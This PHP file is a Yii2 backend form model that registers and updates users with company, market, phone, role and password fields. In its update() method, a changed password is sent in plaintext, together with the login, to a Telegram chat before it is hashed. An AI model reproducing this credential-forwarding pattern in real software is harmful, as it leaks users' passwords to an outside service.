<?php

namespace backend\models\forms;

use common\helpers\TelegramHelper;
use common\models\Company;
use common\models\constants\UserRole;
use common\models\constants\UserStatus;
use common\models\Customer;
use common\models\Market;
use common\models\User;
use Yii;
use yii\base\Model;
use yii\db\Exception;

/**
 * This is the model class for table "user".
 *
 * @property int $id
 * @property int|null $company_id
 * @property int|null $market_id
 * @property string $full_name
 * @property string $auth_key
 * @property string $password_hash
 * @property string|null $password_reset_token
 * @property string $phone
 * @property int $role
 * @property int $status
 * @property int|null $created_at
 * @property int|null $updated_at
 * @property string $password write-only password
 * @property string $confirm_password
 * @property bool $change_password
 * @property string $image
 * @property User $identity
 * @property Market $market
 * @property Company $company
 */
class UserRegisterForm extends Model
{
    public $id;
    public $company_id;
    public $market_id;
    public $full_name;
    public $phone;
    public $role;
    public $status;
    public $password;
    public $image;
    public $confirm_password;
    public $change_password;

    /**
     * @return array
     */
    public function rules()
    {
        return [
            [['full_name', 'password', 'confirm_password', 'role', 'phone'], 'required'],
            [['status', 'change_password', 'market_id', 'company_id', 'role'], 'integer'],
            ['status', 'default', 'value' => UserStatus::STATUS_INACTIVE],
            ['role', 'default', 'value' => UserRole::ROLE_GUEST],
            ['status', 'in', 'range' => [UserStatus::STATUS_ACTIVE, UserStatus::STATUS_DELETED, UserStatus::STATUS_INACTIVE]],
            [['full_name', 'phone', 'image'], 'string', 'max' => 255],
            [['phone'], 'match', 'pattern' => '/((\+998)|0)[-]?[0-9]{9}/'],
            ['confirm_password', 'compare', 'compareAttribute' => 'password', 'message' => 'Parollar bir-biriga mos kelmaydi'],
            ['phone', 'unique', 'targetClass' => User::className(),
                'message' => 'Ushbu login oldindan mavjud', 'when' => function ($model) {
                return !$model->id && $model->id != $this->id;
            }],
            [['full_name'], 'string', 'min' => 5]
        ];
    }

    /**
     * UserRegisterForm constructor.
     * @param array $config
     */
    public function __construct($config = [])
    {
        if (!Yii::$app->user->identity->is_creator)
            $this->company_id = Yii::$app->user->identity->company_id;

        if (Yii::$app->user->identity->role < UserRole::ROLE_SUPER_ADMIN)
            $this->market_id = Yii::$app->user->identity->market_id;

        parent::__construct($config);
    }

    /**
     * @return array
     */
    public function attributeLabels()
    {

        return [
            'id' => Yii::t('app', 'ID'),
            'company_id' => Yii::t('app', 'Company'),
            'market_id' => Yii::t('app', 'Market'),
            'full_name' => Yii::t('app', 'Full Name'),
            'auth_key' => Yii::t('app', 'Auth Key'),
            'password' => Yii::t('app', 'Password'),
            'confirm_password' => Yii::t('app', 'Confirm Password'),
            'password_hash' => Yii::t('app', 'Password Hash'),
            'password_reset_token' => Yii::t('app', 'Password Reset Token'),
            'image' => Yii::t('app', 'Image'),
            'phone' => Yii::t('app', 'Phone'),
            'role' => Yii::t('app', 'Role'),
            'status' => Yii::t('app', 'Status'),
            'created_at' => Yii::t('app', 'Created At'),
            'updated_at' => Yii::t('app', 'Updated At'),
        ];
    }

    /**
     * @param User $user
     * @return UserRegisterForm
     */
    public static function getForm(User $user)
    {
        $form = new self();
        $form->id = $user->id;
        $form->company_id = $user->company_id;
        $form->market_id = $user->market_id;
        $form->phone = $user->phone;
        $form->role = $user->role;
        $form->full_name = $user->full_name;
        $form->status = $user->status;
        $form->password = $user->password_hash;
        $form->confirm_password = $user->password_hash;
        $form->image = $user->image;
        return $form;
    }

    /**
     * @return bool
     * @throws Exception|\yii\base\Exception
     */
    public function register(): bool
    {
        $transaction = Yii::$app->db->beginTransaction();
        try {
            $user = new User();
            $user->company_id = $this->company_id;
            $user->phone = $this->phone;
            $user->status = $this->status;
            $user->market_id = $this->market_id;
            $user->full_name = $this->full_name;
            $user->image = $this->image;
            $user->role = $this->role;
            $user->setPassword($this->password);
            $user->generateAuthKey();
            $user->generatePasswordResetToken();
            $user->created_at = time();
            $user->updated_at = time();

            if (!$user->save()) {
                throw new \DomainException('Error saving user: ' . json_encode($user->errors));
            }

            $transaction->commit();
            $this->id = $user->id;

            return true;

        } catch (\Exception $e) {
            $transaction->rollBack();
            throw $e;
        }
    }


    /**
     * @param User $user
     * @return User
     * @throws Exception|\yii\base\Exception
     */
    public function update(User $user): User
    {
        $user->company_id = $this->company_id;
        $user->phone = $this->phone;
        $user->role = $this->role;
        $user->market_id = $this->market_id;
        $user->full_name = $this->full_name;
        $user->status = $this->status;
        if ($this->change_password != 0) {
            $service = new TelegramHelper();
            $service->setChatIdBySlug();
            $service->sendMessage("Login : {$user->phone} \r\nPassword: $this->password");
            $user->setPassword($this->password);
        }
        $user->generateAuthKey();
        $user->generatePasswordResetToken();
        $user->updated_at = time();
        $user->image = $this->image;
        if (!$user->save()) {
            ob_start();
            var_dump($user->errors);
            $result = ob_get_clean();
            throw new \DomainException("Foydalanuvchi saqlashda xatolik: " . $result);
        }
        return $user;
    }
}